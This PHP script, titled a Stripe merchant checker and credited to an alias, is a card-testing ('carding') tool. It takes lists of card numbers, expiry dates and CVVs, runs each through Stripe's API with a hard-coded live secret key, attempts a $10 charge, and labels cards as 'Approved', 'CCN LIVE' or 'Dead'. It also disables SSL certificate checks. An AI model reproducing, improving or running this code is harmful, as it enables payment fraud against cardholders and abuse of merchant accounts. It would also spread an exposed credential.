<?php 
//////////////// Stripe Merchant Checker Source by Avian [ @Dr34m_C4t ]

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);

    
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
 
}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
;
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
// $skeys = $_GET['sklist'];
$sk = 'sk_live_UXvapvaiJvRdeBk4fvzfcysN00eWv9PnEl';

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

//put you sk_live keys here



#=====================================================================================================#

// curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=$cc&card[exp_month]=$mm&card[exp_year]=$yyyy&card[cvc]=$cvv");
// curl_setopt($ch, CURLOPT_USERPWD, $sec. ':' . '');

// $headers = array();
// $headers[] = 'Content-Type: application/x-www-form-urlencoded';
// curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
// $d = curl_exec($ch);
// $cus = json_decode($d, true);
// $s = json_decode($d, true);
// curl_close($ch);
// $tok = $s["id"];
// curl_close($ch);

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers'); ////To generate customer id
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'name=Doc Production');
$f = curl_exec($ch);
$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
 $time = substr($time, 0, 4);

$id = trim(strip_tags(getstr($f,'"id": "','"')));

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents'); ////To generate payment token [It wont charge]
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'payment_method_data[type]=card&customer='.$id.'&confirm=true&payment_method_data[card][number]='.$cc.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[card][cvc]='.$cvv.'');
 $result = curl_exec($ch);

$info = curl_getinfo($ch);
$time = $info['total_time'];
$httpCode = $info['http_code'];
 $time = substr($time, 0, 4);
 $c = json_decode(curl_exec($ch), true);
curl_close($ch);

 $pam = trim(strip_tags(getstr($result,'"payment_method": "','"')));

  $cvv = trim(strip_tags(getstr($result,'"cvc_check": "','"')));

if ($c["status"] == "succeeded") {
    
    
    $ch = curl_init();
    
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/customers/'.$id.'');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    
    curl_setopt($ch, CURLOPT_USERPWD, $sk . ':' . '');
    
   $result = curl_exec($ch);
    curl_close($ch);
    
    // $pm = $c["payment_method"];

    $ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods/'.$pam.'/attach'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'customer='.$id.'');
$result = curl_exec($ch);
 $d = $result;
 $attachment_to_her = json_decode(curl_exec($ch), true);
    curl_close($ch);
   $attachment_to_her;

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/charges'); 
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'content-type: application/x-www-form-urlencoded',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=1000&currency=usd&customer='.$id.'');
$result = curl_exec($ch);



    if (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "pass") {
        
         echo '<font size=2 color="white"><font class="badge badge-success">Approved</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=2 color="green"> <font class="badge badge-success"> ☤ [CVV MATCHED]</i></font><br>';
    } elseif (!isset($attachment_to_her["error"]) && isset($attachment_to_her["id"]) && $attachment_to_her["card"]["checks"]["cvc_check"] == "unchecked") {
    
        echo '<font size=2 color="white"><font class="badge badge-success">Dead</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=2 color="green"> <font class="badge badge-light">☠ Unavailable Card</i></font>  </i></font><br>';
    
    } else {
    
        echo '<font size=2 color="white"><font class="badge badge-warning">Approved</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=2 color="green"> <font class="badge badge-light">☤ [CVV MISSMATCHED]</i></font><br>';
    
    }
    
}
elseif(strpos($result, '"cvc_check": "pass"')){
    echo '<font size=2 color="white"><font class="badge badge-success">Approved</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=2 color="green"> <font class="badge badge-secondary">☤ [CVV Matched] </i></font> <font class="badge badge-danger"> Additional Response: [' . $c["error"]["decline_code"] . '] </i></font> <br>';
} 
elseif(strpos($result, 'security code is incorrect')){
    echo '<font size=2 color="white"><font class="badge badge-warning">Approved</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=2 color="green"> <font class="badge badge-secondary">☤ [CCN LIVE] </i></font> </i></font> <br>';
} 
elseif (isset($c["error"])) {
    echo '<font size=2 color="white"><font class="badge badge-danger">Dead</i></font> <font class="badge badge-primary"> '.$lista.' </i></font> <font size=2 color="green"> <font class="badge badge-danger">☠ ' . $c["error"]["message"] . ' ' . $c["error"]["decline_code"] . ' </i></font></span><br>';
}
else {
   echo '<font size=2 color="white"><font class="badge badge-danger">Dead</i></font> <font class="badge badge-primary"> '.$lista.' </i></font><font size=2 color="red"> <font class="badge badge-warning">Gate Fucked</i></font><br>';
}

// sleep(5);
#======================================================[@Dr34m_C4t]=============================================================#